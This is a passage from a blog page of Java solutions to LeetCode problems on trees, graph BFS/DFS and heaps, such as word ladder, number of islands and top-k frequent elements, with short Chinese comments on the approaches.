&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="958-二叉树的完全性检验"><a href="#958-二叉树的完全性检验" class="headerlink" title=" 958. 二叉树的完全性检验"></a><a href="https://leetcode-cn.com/problems/check-completeness-of-a-binary-tree"> 958. 二叉树的完全性检验</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isCompleteTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        LinkedList&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span> ((cur = queue.poll()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            queue.add(cur.left);</span><br><span class="line">            queue.add(cur.right);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (queue.poll() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="129-求根到叶子节点数字之和"><a href="#129-求根到叶子节点数字之和" class="headerlink" title="129. 求根到叶子节点数字之和"></a><a href="https://leetcode-cn.com/problems/sum-root-to-leaf-numbers">129. 求根到叶子节点数字之和</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sumNumbers</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        dfs(root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(TreeNode root, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> (val * <span class="number">10</span> + root.val);</span><br><span class="line">        <span class="keyword">if</span> (root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">            sum += k;</span><br><span class="line">        &#125;</span><br><span class="line">        dfs(root.left, k);</span><br><span class="line">        dfs(root.right, k);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><h3 id="127-单词接龙"><a href="#127-单词接龙" class="headerlink" title="127. 单词接龙"></a><a href="https://leetcode-cn.com/problems/word-ladder/">127. 单词接龙</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// BFS</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">ladderLength</span><span class="params">(String beginWord, String endWord, List&lt;String&gt; wordList)</span> &#123;</span><br><span class="line"></span><br><span class="line">        HashSet&lt;String&gt; wordSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(wordList);</span><br><span class="line">        <span class="keyword">if</span> (wordSet.size() == <span class="number">0</span> || !wordSet.contains(endWord)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        LinkedList&lt;String&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.offer(beginWord);</span><br><span class="line">        HashSet&lt;String&gt; visited = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        visited.add(beginWord);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">currrentSize</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; currrentSize; i++) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">curWord</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                <span class="keyword">if</span> (bfs(curWord, endWord, wordSet, visited, queue)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> size + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            size++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">bfs</span><span class="params">(String curWord, String endWord, HashSet&lt;String&gt; wordSet, HashSet&lt;String&gt; visited, LinkedList&lt;String&gt; queue)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; endWord.length(); i++) &#123;</span><br><span class="line">            <span class="type">char</span>[] cur = curWord.toCharArray();</span><br><span class="line">            <span class="type">char</span> <span class="variable">originChar</span> <span class="operator">=</span> cur[i];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> <span class="variable">j</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span>; j &lt;= <span class="string">&#x27;z&#x27;</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j == originChar) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                cur[i] = j;</span><br><span class="line">                <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> String.valueOf(cur);</span><br><span class="line">                <span class="keyword">if</span> (wordSet.contains(temp)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (temp.equals(endWord)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (!visited.contains(temp)) &#123;</span><br><span class="line">                        visited.add(temp);</span><br><span class="line">                        queue.offer(temp);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">			cur[i] = originChar;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 双向BFS, 知道起点和终点即可用双向</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">ladderLength</span><span class="params">(String beginWord, String endWord, List&lt;String&gt; wordList)</span> &#123;</span><br><span class="line">       Set&lt;String&gt; wordSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(wordList);</span><br><span class="line">       <span class="keyword">if</span> (wordSet.size() == <span class="number">0</span> || !wordSet.contains(endWord)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       Set&lt;String&gt; visited = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">       Set&lt;String&gt; beginVisited = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">       Set&lt;String&gt; endVisited = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">       beginVisited.add(beginWord);</span><br><span class="line">       endVisited.add(endWord);</span><br><span class="line">       <span class="type">int</span> <span class="variable">step</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">       <span class="keyword">while</span> (!beginVisited.isEmpty() &amp;&amp; !endVisited.isEmpty()) &#123;</span><br><span class="line">           <span class="keyword">if</span> (beginVisited.size() &gt; endVisited.size()) &#123;</span><br><span class="line">               Set&lt;String&gt; temp = beginVisited;</span><br><span class="line">               beginVisited = endVisited;</span><br><span class="line">               endVisited = temp;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           Set&lt;String&gt; nextLevel = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">           <span class="keyword">for</span> (String word :</span><br><span class="line">                   beginVisited) &#123;</span><br><span class="line">               <span class="keyword">if</span> (bfs(word, endVisited, visited, wordSet, nextLevel)) &#123;</span><br><span class="line">                   <span class="keyword">return</span> step + <span class="number">1</span>;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line">           beginVisited = nextLevel;</span><br><span class="line">           step++;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">bfs</span><span class="params">(String word, Set&lt;String&gt; endVisited, Set&lt;String&gt; visited, Set&lt;String&gt; wordSet, Set&lt;String&gt; nextLevel)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] s = word.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; word.length(); i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">originChar</span> <span class="operator">=</span> s[i];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> <span class="variable">j</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span>; j &lt;= <span class="string">&#x27;z&#x27;</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j == originChar) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                s[i] = j;</span><br><span class="line">                <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> String.valueOf(s);</span><br><span class="line">                <span class="keyword">if</span> (wordSet.contains(temp)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (endVisited.contains(temp)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (!visited.contains(temp)) &#123;</span><br><span class="line">                        nextLevel.add(temp);</span><br><span class="line">                        visited.add(temp);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            s[i] = originChar;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="剑指-Offer-12-矩阵中的路径"><a href="#剑指-Offer-12-矩阵中的路径" class="headerlink" title="剑指 Offer 12. 矩阵中的路径"></a><a href="https://leetcode-cn.com/problems/ju-zhen-zhong-de-lu-jing-lcof/">剑指 Offer 12. 矩阵中的路径</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">exist</span><span class="params">(<span class="type">char</span>[][] board, String word)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (board == <span class="literal">null</span> || board.length == <span class="number">0</span> || board[<span class="number">0</span>].length == <span class="number">0</span>  || word == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(word)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">char</span>[] wc = word.toCharArray();</span><br><span class="line">        <span class="type">boolean</span>[][] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[board.length][board[<span class="number">0</span>].length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; board.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; board[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">               <span class="keyword">if</span> (dfs(board, i, j, visited, wc, <span class="number">0</span>)) &#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">boolean</span>[][] visited, <span class="type">char</span>[] wc, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i == board.length || j &lt; <span class="number">0</span> || j == board[<span class="number">0</span>].length || visited[i][j] || board[i][j] != wc[start]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (wc.length - <span class="number">1</span> == start) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[i][j] = <span class="literal">true</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">res</span> <span class="operator">=</span> dfs(board, i + <span class="number">1</span>, j, visited, wc, start + <span class="number">1</span>)</span><br><span class="line">                || dfs(board, i - <span class="number">1</span>, j, visited, wc, start + <span class="number">1</span>)</span><br><span class="line">                || dfs(board, i, j + <span class="number">1</span>, visited, wc, start + <span class="number">1</span>)</span><br><span class="line">                || dfs(board, i, j - <span class="number">1</span>, visited, wc, start + <span class="number">1</span>);</span><br><span class="line">        visited[i][j] = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="剑指-Offer-13-机器人的运动范围"><a href="#剑指-Offer-13-机器人的运动范围" class="headerlink" title="剑指 Offer 13. 机器人的运动范围"></a><a href="https://leetcode-cn.com/problems/ji-qi-ren-de-yun-dong-fan-wei-lcof/">剑指 Offer 13. 机器人的运动范围</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">movingCount</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span>[][] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[m][n];</span><br><span class="line">        <span class="keyword">return</span> dfs(<span class="number">0</span>, <span class="number">0</span>, m, n, k, visited);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> m, <span class="type">int</span> n, <span class="type">int</span> k, <span class="type">boolean</span>[][] visited)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= m || j &lt; <span class="number">0</span> || j &gt;= n || (i/<span class="number">10</span> + i%<span class="number">10</span> + j/<span class="number">10</span> + j%<span class="number">10</span>) &gt; k || visited[i][j]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[i][j] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> dfs(i + <span class="number">1</span>, j, m, n, k, visited) + dfs(i, j + <span class="number">1</span>, m, n, k, visited)</span><br><span class="line">                + dfs(i - <span class="number">1</span>, j, m, n, k, visited) + dfs(i, j - <span class="number">1</span>, m, n, k, visited) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="200-岛屿数量"><a href="#200-岛屿数量" class="headerlink" title=" 200. 岛屿数量"></a><a href="https://leetcode-cn.com/problems/number-of-islands"> 200. 岛屿数量</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numIslands</span><span class="params">(<span class="type">char</span>[][] grid)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">landNum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; grid.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; grid[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                    infect(grid, i, j);</span><br><span class="line">                    landNum++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> landNum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">infect</span><span class="params">(<span class="type">char</span>[][] grid, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= grid.length || j &lt; <span class="number">0</span> || j &gt;= grid[<span class="number">0</span>].length || grid[i][j] != <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        grid[i][j] = <span class="number">2</span>;</span><br><span class="line">        infect(grid, i + <span class="number">1</span>, j);</span><br><span class="line">        infect(grid, i - <span class="number">1</span>, j);</span><br><span class="line">        infect(grid, i, j + <span class="number">1</span>);</span><br><span class="line">        infect(grid, i, j - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><h3 id="215-数组中的第K个最大元素-x2F"><a href="#215-数组中的第K个最大元素-x2F" class="headerlink" title="215. 数组中的第K个最大元素&#x2F;"></a><a href="https://leetcode-cn.com/problems/kth-largest-element-in-an-array/">215. 数组中的第K个最大元素</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//从heapSize / 2开始往上堆化</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findKthLargest</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">heapSize</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        buildMaxHeap(nums, heapSize);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            swap(nums, <span class="number">0</span>, heapSize - <span class="number">1</span>);</span><br><span class="line">            heapSize--;</span><br><span class="line">            maxHeapify(nums, <span class="number">0</span>, heapSize);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">maxHeapify</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> i, <span class="type">int</span> heapSize)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> i * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> i * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> i;</span><br><span class="line">        <span class="keyword">if</span> (l &lt; heapSize &amp;&amp; nums[l] &gt; nums[max]) &#123;</span><br><span class="line">            max = l;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (r &lt; heapSize &amp;&amp; nums[r] &gt; nums[max]) &#123;</span><br><span class="line">            max = r;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (max != i) &#123;</span><br><span class="line">            swap(nums, i, max);</span><br><span class="line">            maxHeapify(nums, max, heapSize);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">buildMaxHeap</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> heapSize)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> heapSize / <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            maxHeapify(nums, i, heapSize);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> nums[a];</span><br><span class="line">        nums[a] = nums[b];</span><br><span class="line">        nums[b] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="23-合并K个升序链表-x2F-x2F"><a href="#23-合并K个升序链表-x2F-x2F" class="headerlink" title="23. 合并K个升序链表&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/merge-k-sorted-lists/">23. 合并K个升序链表</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用堆</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">mergeKLists</span><span class="params">(ListNode[] lists)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (lists.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        PriorityQueue&lt;ListNode&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((x, y)-&gt; x.val - y.val);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        dummy.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tail</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; lists.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lists[i] != <span class="literal">null</span>) &#123;</span><br><span class="line">                pq.add(lists[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!pq.isEmpty()) &#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">node</span> <span class="operator">=</span> pq.poll();</span><br><span class="line">            tail.next = node;</span><br><span class="line">            tail = tail.next;</span><br><span class="line">            <span class="keyword">if</span> (node.next != <span class="literal">null</span>) &#123;</span><br><span class="line">                pq.add(node.next);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="347-前-K-个高频元素"><a href="#347-前-K-个高频元素" class="headerlink" title="347. 前 K 个高频元素"></a><a href="https://leetcode-cn.com/problems/top-k-frequent-elements/">347. 前 K 个高频元素</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// topk （前k大）用小根堆，维护堆大小不超过 k 即可。每次压入堆前和堆顶元素比较，如果比堆顶元素还小，直接扔掉，否则压入堆。检查堆大小是否超过 k，如果超过，弹出堆顶。复杂度是 nlogk</span></span><br><span class="line"><span class="comment">// 避免使用大根堆，因为你得把所有元素压入堆，复杂度是 nlogn，而且还浪费内存。如果是海量元素，那就挂了。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] topKFrequent(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        HashMap&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            map.put(num, map.getOrDefault(num, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        PriorityQueue&lt;Integer&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((x, y) -&gt; map.get(x) - map.get(y));</span><br><span class="line">        <span class="keyword">for</span> (Integer key :</span><br><span class="line">                map.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pq.size() &lt; k) &#123;</span><br><span class="line">                pq.add(key);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (map.get(pq.peek()) &lt; map.get(key)) &#123;</span><br><span class="line">                pq.remove();</span><br><span class="line">                pq.add(key);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[k];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> k - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (!pq.isEmpty()) &#123;</span><br><span class="line">            res[i--] = pq.remove();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 桶排序</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] topKFrequent(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        HashMap&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            map.put(num, map.getOrDefault(num, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        List&lt;Integer&gt;[] lists = <span class="keyword">new</span> <span class="title class_">List</span>[nums.length + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (Integer key :</span><br><span class="line">                map.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lists[map.get(key)] == <span class="literal">null</span>) &#123;</span><br><span class="line">                lists[map.get(key)] = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line">            lists[map.get(key)].add(key);</span><br><span class="line">        &#125;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> nums.length; i &gt; <span class="number">0</span> &amp;&amp; list.size() &lt; k; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lists[i] == <span class="literal">null</span>) &#123;</span><br><span class="line">                